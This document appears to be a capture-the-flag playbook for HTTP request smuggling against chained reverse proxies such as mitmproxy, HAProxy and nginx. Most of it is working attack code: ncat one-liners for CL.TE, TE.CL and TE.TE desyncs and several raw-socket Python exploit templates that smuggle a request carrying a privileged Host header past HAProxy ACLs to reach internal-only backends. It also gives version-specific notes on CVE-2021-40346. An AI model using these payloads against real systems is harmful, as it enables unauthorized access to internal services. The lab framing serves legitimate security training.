## HTTP Request Smuggling Playbook

### Step 0 — Read source FIRST
Smuggling challenges are almost always whitebox. Look at the proxy config (`haproxy.cfg`, `nginx.conf`, `Caddyfile`, etc.) and the upstream app code:
- **HAProxy version + flags**: `option http-use-htx` is the legacy mode (vulnerable to CL.TE). Look for `no option http-use-htx` (forces legacy parser) — HAProxy 2.0.x without HTX is vulnerable.
- **nginx version**: `nginx <1.21` has multiple known smuggling CVEs.
- **ACL routing by Host header** (e.g. `acl <name> hdr(host) -i <privileged-vhost>`) → smuggle a request whose `Host:` is the privileged one.
- **The flag is usually behind a backend the proxy thinks only "internal" can reach** — your job is to deliver a request to that backend with the privileged Host header.

### Step 1 — Identify the smuggling primitive

Test which combination the proxy and backend disagree on:

```bash
# CL.TE: front uses Content-Length, back uses Transfer-Encoding
printf 'POST / HTTP/1.1\r\nHost: TARGET_HOST\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED' | \
  ncat --no-shutdown TARGET_HOST PORT

# TE.CL: front uses Transfer-Encoding, back uses Content-Length
printf 'POST / HTTP/1.1\r\nHost: TARGET_HOST\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n' | \
  ncat --no-shutdown TARGET_HOST PORT

# TE.TE: obfuscated TE header makes one party fall back to CL
printf 'POST / HTTP/1.1\r\nHost: TARGET_HOST\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nHost: x\r\n\r\n0\r\n\r\n' | \
  ncat --no-shutdown TARGET_HOST PORT
```

Use `smuggler.py` (https://github.com/defparam/smuggler) when available — it tests all primitives automatically:
```bash
python3 /opt/smuggler/smuggler.py -u http://TARGET_HOST:PORT -m all
```

### Step 1.5 — Multi-hop reverse-proxy chain (mitmproxy → HAProxy → app)

A common multi-tier proxy pattern: **`mitmproxy 6.0.2` (frontend, exposed port) → `haproxy 2.0.5` with `no option http-use-htx` (port 8001) → backend app**.
- mitmproxy 6.0.2 is **vulnerable to CL.TE smuggling** (it forwards Transfer-Encoding verbatim while honouring Content-Length itself).
- HAProxy in legacy mode (`no option http-use-htx`) honours Transfer-Encoding.
- Result: the frontend buffers `Content-Length` bytes; the smuggled `chunked` tail is parsed by HAProxy as the **next request on the keep-alive connection**.
- The smuggled request can carry a privileged `Host: <internal-vhost>` header → reaches the internal-only backend.

**Concrete exploit template (CL.TE → HAProxy ACL bypass):**
```python
import socket, time
HOST, PORT = "host.docker.internal", 8002        # frontend proxy port — read docker-compose.yml
INTERNAL_HOST = "<INTERNAL_VHOST>"               # the privileged Host the ACL allows — read haproxy.cfg `acl ... hdr(host) -i ...`
FLAG_PATH = "<INTERNAL_FLAG_PATH>"               # the endpoint on the internal backend — discover by reading the internal app's source (routes.py / urls.py / @app.route)

smuggled = (
    f"GET {FLAG_PATH} HTTP/1.1\r\n"
    f"Host: {INTERNAL_HOST}\r\n"
    f"Content-Length: 10\r\n"
    f"\r\n"
    f"x=1"  # 3 bytes of padding so HAProxy waits for next req on conn
)
body = "0\r\n\r\n" + smuggled
front = (
    f"POST / HTTP/1.1\r\n"
    f"Host: any\r\n"
    f"Content-Length: {len(body)}\r\n"
    f"Transfer-Encoding: chunked\r\n"
    f"Connection: keep-alive\r\n"
    f"\r\n{body}"
).encode()

s = socket.create_connection((HOST, PORT))
s.sendall(front)
time.sleep(0.5)
# Send a follow-up request on the SAME connection — HAProxy parses smuggled bytes first
s.sendall(b"GET / HTTP/1.1\r\nHost: any\r\n\r\n")
time.sleep(2)
data = b""
s.settimeout(3)
try:
    while True:
        chunk = s.recv(65536)
        if not chunk: break
        data += chunk
except socket.timeout: pass
print(data.decode(errors='replace'))
# Look for the second concatenated HTTP response — the smuggled request's body contains the flag
```

If HAProxy returns 400 or strips the smuggled bytes, try TE.CL (swap which side honours which) or the empty-header variant in Step 2.

### Step 2 — HAProxy 2.0.x specific (CVE-2021-40346 and friends)

When you see `haproxy 2.0.5` + `no option http-use-htx` in the cfg, the legacy parser is active. The reliable smuggling primitive is:

**Empty header smuggling** — HAProxy treats `\0Header: x` as a separator on the prior line, the backend treats it as a new request:
```bash
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length0aaaaaaaaaaaaa: 30\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal.target\r\n\r\n' | \
  ncat TARGET 80
```

**Integer overflow in CL** (CVE-2021-40346):
```bash
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length0aaaaaaaaaaaaa: 30\r\nContent-Length: 5\r\n\r\n12345SMUGGLED REQUEST HERE' | \
  ncat TARGET 80
```

### Step 3 — Compose the smuggled internal request

Once a primitive works, smuggle a request that:
1. Has the **privileged `Host:` header** matching the ACL allow-list value from haproxy.cfg / nginx.conf
2. Asks for the **flag-serving endpoint** on the internal backend (find it by reading the internal app's routes — `routes.py`, `urls.py`, `@app.route` decorators, etc. — common candidates: `/admin`, `/internal`, `/flag`, `/api/<resource>/status`)

```python
import socket
target_host, target_port = "host.docker.internal", 12345
internal_host = "<INTERNAL_VHOST>"      # from proxy ACL config
flag_path = "<INTERNAL_FLAG_PATH>"       # from internal app's route table

smuggled = (
    f"GET {flag_path} HTTP/1.1\r\n"
    f"Host: {internal_host}\r\n"
    f"Content-Length: 0\r\n\r\n"
)
chunked_body = f"0\r\n\r\n{smuggled}"
front = (
    f"POST / HTTP/1.1\r\n"
    f"Host: any\r\n"
    f"Content-Length: {len(chunked_body)}\r\n"
    f"Transfer-Encoding: chunked\r\n\r\n"
    f"{chunked_body}"
).encode()

# Send TWO requests on one connection — the smuggled bytes prefix the second
s = socket.create_connection((target_host, target_port))
s.sendall(front + b"GET / HTTP/1.1\r\nHost: any\r\n\r\n")
import time; time.sleep(2)
data = b""
while True:
    chunk = s.recv(65536)
    if not chunk: break
    data += chunk
print(data.decode(errors='replace'))
# Look for the flag in the second response (the smuggled one)
```

### Step 4 — Find the flag in the response

The smuggled request's response is concatenated AFTER the response to the connection's first/second request. Parse for `FLAG{` or `flag{`. If you only see the front response, increase the chunked body size or try a different primitive.

### Common Mistakes
- **Missing trailing `\r\n\r\n`**: every HTTP message needs proper termination
- **Wrong `Content-Length`**: must equal exact byte count of the body, including the smuggled bytes
- **Using requests/urllib**: those libraries normalize/sanitize headers — you MUST use raw sockets (`socket.create_connection`) or `ncat`
- **Forgetting to send a SECOND request**: the smuggled prefix attaches to the next victim request on the connection
- **Not setting `Connection: keep-alive`**: HAProxy default is keep-alive but some backends close after one

### Pattern — Raw socket smuggling against multi-tier proxies

**curl, requests, httpx ALL normalise headers and bodies and CANNOT send smuggling payloads.** You must write raw HTTP over a TCP socket. This is non-negotiable for HTTP Request Smuggling — every HTTP client library you've heard of will rewrite `Transfer-Encoding`, fix `Content-Length`, lowercase headers, or refuse malformed requests.

#### When to suspect smuggling
- The challenge name/description mentions "outdated proxies", "HRS", "desync", "router".
- `docker-compose.yml` shows ≥ 2 reverse proxies in chain (haproxy → mitmproxy → app, nginx → uwsgi, etc.).
- haproxy config contains `option http-use-htx` toggled OR uses haproxy ≤ 2.0.x (HTX off by default before 2.1).
- An ACL routes by `hdr(host)` to a privileged backend (look for `acl ... hdr(host) -i <name>` lines in haproxy.cfg).
- A backend uses `http-reuse always` (connection pooling = perfect smuggling target).

#### The two classic primitives

**CL.TE** (front honors `Content-Length`, back honors `Transfer-Encoding`):
```
POST / HTTP/1.1
Host: target
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```
Front sees one request of 13 bytes (`0\r\n\r\nSMUGGLED`). Back sees the chunked body terminated at `0\r\n\r\n` and treats `SMUGGLED` as the start of the NEXT request on the pooled connection.

**TE.CL** (front honors `Transfer-Encoding`, back honors `Content-Length`):
```
POST / HTTP/1.1
Host: target
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```
Front consumes the chunks. Back stops at `Content-Length: 3` (which is `8\r\n`) and treats `SMUGGLED\r\n0\r\n\r\n` as a new request.

**TE.TE** (header obfuscation — most common today):
```
Transfer-Encoding: chunked
Transfer-Encoding: x

```
or with whitespace:
```
Transfer-Encoding : chunked
```
or with bad chunk extension `chunked; charset=foo`. Each proxy version parses these differently.

#### Full Python exploit template
```python
import socket, ssl

HOST = "TARGET"; PORT = 8001  # haproxy frontend

# The smuggled request is a FULL HTTP request that the backend will parse on
# the next read of the pooled connection. Set Host to reach a privileged vhost.
smuggled = (
    "GET <INTERNAL_FLAG_PATH> HTTP/1.1\r\n"
    "Host: <INTERNAL_VHOST>\r\n"
    "Content-Length: 0\r\n"
    "\r\n"
).encode()

# CL.TE primitive — adjust based on which proxy honors what.
front = (
    f"POST / HTTP/1.1\r\n"
    f"Host: target.example\r\n"
    f"Content-Length: {len(smuggled) + 5}\r\n"   # 5 = "0\r\n\r\n"
    f"Transfer-Encoding: chunked\r\n"
    f"Connection: keep-alive\r\n"
    f"\r\n"
    f"0\r\n\r\n"
).encode() + smuggled

s = socket.create_connection((HOST, PORT), timeout=15)
s.sendall(front)
# IMPORTANT: send a SECOND benign request on the SAME connection — the
# smuggled response arrives in response to that one.
s.sendall(b"GET / HTTP/1.1\r\nHost: target.example\r\nConnection: close\r\n\r\n")

data = b""
while True:
    chunk = s.recv(65536)
    if not chunk: break
    data += chunk
print(data.decode(errors="replace"))
# Look for two HTTP responses concatenated. The SECOND one is the smuggled
# response containing the flag.
s.close()
```

#### Bypassing internal-only routing via Host header
If a proxy ACL routes by `Host` (e.g. `acl <name> hdr(host) -i <vhost>`), smuggling lets you submit an internal-host request that the front proxy never sees:

```python
smuggled = (
    "GET <INTERNAL_PATH> HTTP/1.1\r\n"
    "Host: <INTERNAL_VHOST>\r\n"   # ← only the BACKEND sees this Host
    "Content-Length: 0\r\n"
    "\r\n"
).encode()
```

#### Pitfalls
- **You MUST keep the connection open and send a follow-up request** to receive the smuggled response. A single sendall + close gives you only the front-proxy's response.
- The smuggled request body MUST end with `\r\n` — without it the backend waits for more data and times out.
- Header casing matters: try `Transfer-Encoding`, `transfer-encoding`, `Transfer-encoding` — proxies parse case differently.
- Try BOTH `\r\n\r\n` and just `\n\n` line terminators — some proxies normalise on parsing but forward bytes.
- haproxy 2.0.x with `no option http-use-htx` is vulnerable to TE.CL with malformed `Transfer-Encoding`. haproxy 2.1+ with HTX rejects most variants → use TE obfuscation (`\x0bchunked`, double TE header).
- mitmproxy 6.0.2 has known smuggling parser bugs around chunk size whitespace.
- `nc target 8001 < req.txt` works for one-shot tests but doesn't keep the connection alive for the follow-up; always script it in Python.
- Some Flask apps emit `Connection: close` by default → smuggling fails because the upstream doesn't reuse the connection. Force `Connection: keep-alive` in the front request.
- DO NOT use curl. DO NOT use requests. DO NOT use httpx. Only `socket.socket` (or `ssl.wrap_socket` for TLS).
